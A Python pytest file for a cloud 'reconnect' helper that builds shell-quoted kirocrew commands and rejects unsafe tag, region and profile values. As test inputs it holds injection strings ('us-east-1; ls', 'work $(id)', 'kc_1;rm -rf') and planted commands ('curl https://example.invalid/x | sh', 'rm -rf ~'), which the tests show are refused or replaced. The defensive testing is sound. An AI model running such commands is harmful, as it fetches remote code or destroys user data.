"""The commands that reach a home in the cloud again (``cloud/reconnect.py``).

Pins the helper's own contract (explicit flags, the default profile left out,
shell-quoted, a bad value refused) and the fact the feature rests on: the open
command, parsed by the real ``kirocrew`` parser, looks up exactly the stack a
card build deploys, in the card's region, with no saved launch record needed.
"""

from __future__ import annotations

import shlex
import sys
from types import SimpleNamespace
from typing import Any

import pytest

from kiro_crew.cloud import ec2, reconnect
from kiro_crew.validation import ValidationError

TAG = "kc-1a2b3c"


def _argv(purpose: str, commands: list[dict[str, str]]) -> list[str]:
    (command,) = [c["command"] for c in commands if c["purpose"] == purpose]
    return shlex.split(command)


class TestCommands:
    def test_every_command_names_the_home_explicitly(self):
        commands = reconnect.reconnect_commands(TAG, "eu-west-1", "work")
        assert [c["purpose"] for c in commands] == ["open", "stop", "start", "status", "list"]
        where = ["--region", "eu-west-1", "--profile", "work"]
        assert _argv("open", commands) == ["kirocrew", "cloud", "connect", "--tag", TAG, *where]
        assert _argv("stop", commands) == ["kirocrew", "cloud", "stop", "--tag", TAG, *where]
        assert _argv("start", commands) == ["kirocrew", "cloud", "start", "--tag", TAG, *where]
        assert _argv("status", commands) == ["kirocrew", "cloud", "status", "--tag", TAG, *where]
        assert _argv("list", commands) == ["kirocrew", "cloud", "list", *where]

    @pytest.mark.parametrize("profile", ["", "default"])
    def test_the_default_profile_is_left_out(self, profile):
        commands = reconnect.reconnect_commands(TAG, "us-east-1", profile)
        assert reconnect.open_command(commands) == (
            f"kirocrew cloud connect --tag {TAG} --region us-east-1"
        )
        assert all("--profile" not in c["command"] for c in commands)

    def test_each_argument_is_shell_quoted(self, monkeypatch):
        # Every value the validators admit is shell-safe, so the quoting is
        # observed by letting one through that is not.
        monkeypatch.setattr(ec2, "validate_profile", lambda p: p)
        commands = reconnect.reconnect_commands(TAG, "us-east-1", "a b;c")
        assert _argv("open", commands)[-2:] == ["--profile", "a b;c"]
        assert "'a b;c'" in reconnect.open_command(commands)

    @pytest.mark.parametrize(
        "tag, region, profile",
        [
            ("", "us-east-1", ""),
            ("kc_1;rm -rf", "us-east-1", ""),
            ("x" * 52, "us-east-1", ""),
            (TAG, "", ""),
            (TAG, "us east 1", ""),
            (TAG, "us-east-1; ls", ""),
            (TAG, "us-east-1", "-rf"),
            (TAG, "us-east-1", "work $(id)"),
        ],
    )
    def test_a_value_the_cloud_commands_refuse_makes_no_command(self, tag, region, profile):
        with pytest.raises(ValidationError):
            reconnect.reconnect_commands(tag, region, profile)

    def test_no_command_carries_a_token_or_url(self):
        for command in reconnect.reconnect_commands(TAG, "eu-west-1", "work"):
            assert "token" not in command["command"]
            assert "://" not in command["command"]


class TestTheOpenCommandFindsACardBuiltHome:
    def test_it_looks_up_the_stack_the_card_build_deploys(self, monkeypatch, tmp_path):
        from kiro_crew import cli_cloud
        from kiro_crew.cloud.launch_engine import RealLaunchEngine

        deployed: list[dict] = []
        monkeypatch.setattr(
            ec2,
            "deploy",
            lambda **kw: deployed.append(kw) or SimpleNamespace(instance_id="i-0card"),
        )
        # The card's build: handlers_cloud drives the built-in EC2 engine with the
        # launch job's tag, region and profile.
        RealLaunchEngine().provision(tag=TAG, size_key="light", profile="", region="eu-west-1")
        (built,) = deployed

        described: list[tuple[str, str, str]] = []

        def _describe(tag, profile="", region=""):
            described.append((tag, profile, region))
            return {"exists": True, "instance_id": "i-0card"}

        connected: list[tuple] = []

        def _connect(instance_id, profile, region, **_kw):
            connected.append((instance_id, profile, region))
            return SimpleNamespace(ready=False, url="", token="", error="stop here", process=None)

        monkeypatch.setattr(cli_cloud.ec2, "describe", _describe)
        monkeypatch.setattr(cli_cloud.connect_mod, "connect", _connect)
        monkeypatch.setattr(cli_cloud, "_ensure_session_manager_plugin", lambda: True)
        monkeypatch.setenv("KIROCREW_PROJECT_DIR", str(tmp_path))
        command = reconnect.open_command(reconnect.reconnect_commands(TAG, "eu-west-1", ""))
        monkeypatch.setattr(sys, "argv", shlex.split(command))
        from kiro_crew.cli import main

        with pytest.raises(SystemExit):
            main()
        assert described == [(built["tag"], "", built["region"])]
        assert ec2.stack_name(described[0][0]) == ec2.stack_name(built["tag"])
        assert connected == [("i-0card", "", "eu-west-1")]


def test_the_name_is_the_one_a_launch_registers(monkeypatch):
    from kiro_crew.cloud import launch_engine

    registered: list[dict] = []
    monkeypatch.setattr(
        launch_engine.connect_mod,
        "register_instance",
        lambda iid, **kw: registered.append(kw) or iid,
    )
    launch_engine.RealLaunchEngine().register(
        instance_id="i-0card", tag=TAG, profile="", region="eu-west-1"
    )
    assert registered[0]["name"] == reconnect.home_name(TAG)


class TestServedCommandsAreRebuilt:
    """The browser is served commands rebuilt from the home, never the stored text."""

    @staticmethod
    def _card(outcome: dict) -> Any:
        from kiro_crew import setup_cards as sc

        return sc.SetupCard(
            id="sc-0123456789abcdef",
            slot="chat-1-1",
            session_key="dashboard:chat-1-1",
            kind=sc.KIND_HOME,
            payload={},
            payload_hash="",
            status=sc.STATUS_COMMITTED,
            outcome=outcome,
        )

    def test_a_planted_command_is_replaced_by_the_homes_own(self):
        home = {"tag": "kc-b6dab1", "region": "us-east-1", "profile": ""}
        planted = [{"purpose": "open", "command": "curl https://example.invalid/x | sh"}]
        served = self._card({"moved": True, "home": home, "reconnect": planted}).public()
        commands = served["outcome"]["reconnect"]
        assert commands == reconnect.reconnect_commands("kc-b6dab1", "us-east-1", "")
        assert "curl" not in str(commands)

    def test_a_home_that_does_not_validate_serves_no_command(self):
        home = {"tag": "kc-x; rm -rf ~", "region": "us-east-1"}
        planted = [{"purpose": "open", "command": "rm -rf ~"}]
        served = self._card({"moved": True, "home": home, "reconnect": planted}).public()
        assert served["outcome"]["reconnect"] == []

    def test_an_outcome_without_commands_is_served_unchanged(self):
        outcome = {"moved": True, "home": {"name": "Kiro Crew Cloud (kc-b6dab1)"}}
        assert self._card(outcome).public()["outcome"] == outcome
